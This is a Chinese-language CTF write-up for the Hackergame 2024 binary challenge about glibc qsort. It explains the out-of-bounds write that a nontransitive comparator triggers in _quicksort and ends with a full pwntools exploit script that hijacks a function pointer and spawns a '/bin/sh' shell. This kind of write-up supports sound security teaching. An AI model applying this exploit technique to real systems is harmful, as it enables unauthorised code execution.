# 我们的快排確有問題

题解作者：[eastXueLian](https://github.com/AvavaAYA)

出题人、验题人、文案设计等：见 [Hackergame 2024 幕后工作人员](../../credits.pdf)。

## 题目描述

- 题目分类：binary

- 题目分值：250

不愿意接受 glibc `qsort()` 的同学，不用来填写（GPA），你们不会受到任何處分！

---

**[点击下载题目附件](files/sort_ur_jipei.zip)**

附件运行不起来？可能是 glibc 版本的问题！使用 `patchelf --replace-needed libc.so.6 ./libc-2.31.so ./sort_ur_jipei && patchelf --set-interpreter ./ld-2.31.so ./sort_ur_jipei` 试试。

你需要运行 `/1w4tch` 来获得 flag。

你可以通过 `nc 202.38.93.141 31341` 来连接，或者点击下面的「打开/下载题目」按钮通过网页终端与远程交互。

> 如果你不知道 `nc` 是什么，或者在使用上面的命令时遇到了困难，可以参考我们编写的 [萌新入门手册：如何使用 nc/ncat？](https://lug.ustc.edu.cn/planet/2019/09/how-to-use-nc/)

[打开/下载题目](http://202.38.93.141:31342/?token={token})

## 题解

本题的 idea 和文案设计是 [@taoky](https://github.com/taoky) 提供的。我做了实现。

题目提供了源码，主要逻辑都在 `main` 函数中，调用 GLIBC 里的 `qsort` 进行了两次排序。从源码来看不存在明显的漏洞 ~~（希望如此）~~，尽管有一个危险的函数指针，但是在内存中被放在排序数组之前，看起来很难篡改：

```c
struct {
        int (*sort_func)(const void *const, const void *const);
        double temp_sort_array[MAX_STU_NUM];
} gms;
```

通过搜索、测试或者~~阅读 GLIBC 源码~~等不同方法都能很快地找到漏洞：

1. 注意到排序函数 `whos_jipiei_is_better` 非常奇怪，例如传入 `a=1.0` 和 `b=4.3` 就会得到 `a<b` 且 `b<a` 的结果，即这是一个非对称也非传递的比较函数。很多情况下非传递的比较函数会影响排序算法的正确性，因此怀疑 GLIBC 的 `qsort` 函数在这种情况下存在越界行为，可以在网上搜索得到 [For the algorithm lovers: Nontransitive comparison functions lead to
out-of-bounds read & write in glibc's qsort()](https://www.qualys.com/2024/01/30/qsort.txt) 这篇来自 [Qualys](https://www.qualys.com/) 的高质量 Write-Up。进行简单阅读后可以对比发现题目 GLIBC 版本小于 2.39、比较函数是非传递的、`malloc` 函数被劫持且始终会返回 `NULL`，均满足漏洞触发条件。
2. 输入一串 `1.0`（数量需要大于 0x80），发现出现了段错误，进行调试注意到 `gms` 结构体中的函数指针居然变成了输入的数据！于是获得控制流劫持的能力。
3. 找到对应版本的 [GLIBC 源码](https://elixir.bootlin.com/glibc/glibc-2.31/source/stdlib/msort.c#L224)，定位到 `qsort` 函数的实现，得到如下惊人的结论：`qsort` 内部实现不是真正意义上的快排，其中优先分配一块内存来进行非原地的归并排序，只有内存分配失败才会进到 `_quicksort` 函数中进行原地排序，其中若遇到了非传递的比较函数则会出现越界写。即下列实现中 `tmp_ptr` 可能出现小于 `base_ptr` 的情况，出现往低地址的越界写：

```c
void
_quicksort (void *const pbase, size_t total_elems, size_t size,
            __compar_d_fn_t cmp, void *arg)
{
  char *base_ptr = (char *) pbase;

    // ...

    char *tmp_ptr = base_ptr;

    // ...

    for (run_ptr = tmp_ptr + size; run_ptr <= thresh; run_ptr += size)
      if ((*cmp) ((void *) run_ptr, (void *) tmp_ptr, arg) < 0)
        tmp_ptr = run_ptr;

    if (tmp_ptr != base_ptr)
      SWAP (tmp_ptr, base_ptr, size);

    run_ptr = base_ptr + size;
    while ((run_ptr += size) <= end_ptr)
      {
        tmp_ptr = run_ptr - size;
        while ((*cmp) ((void *) run_ptr, (void *) tmp_ptr, arg) < 0)
          tmp_ptr -= size;

      }

}
```

现在就可以劫持比较函数为 `doredolaso` 函数地址。最后再结合调试可以得到下次调用比较函数时寄存器内的数据，在数组中布置后门函数地址和 `b"/bin/sh\x00"` 字符串控制 `system` 函数的参数并拿到 shell。

完整利用代码如下：

```python
#!/usr/bin/env python3
# 傳自我的馬克布克

from pwn import *

context.log_level = "info"
context.arch = "amd64"

io = remote("202.38.93.141", 31341)

JOP_gadget = 0x4011DD
GET_my_hwatch_addr = 0x401201

io.recvline()
io.sendline(input("Input your token: ").encode())


def i64tof64(int_value):
    bytes_value = struct.pack("<Q", int_value)
    double_value = struct.unpack("<d", bytes_value)[0]
    return double_value


def f64toi64(double_value):
    bytes_value = struct.pack("<d", double_value)
    int_value = struct.unpack("<Q", bytes_value)[0]
    return int_value


io.recvuntil(":\n".encode())
io.sendline(str(0x100).encode())

stu_list = [4.3 for i in range(0x100)]
stu_list[0x10] = i64tof64(JOP_gadget)

io.recvuntil(":\n".encode())
for i in stu_list:
    io.sendline(str(i).encode())

io.recvuntil(b"...\n")
io.sendline(str(i64tof64(GET_my_hwatch_addr)).encode())
for _ in range(0x100 - 1):
    io.sendline(str(i64tof64(u64(b"/bin/sh\x00"))).encode())

io.interactive()
```
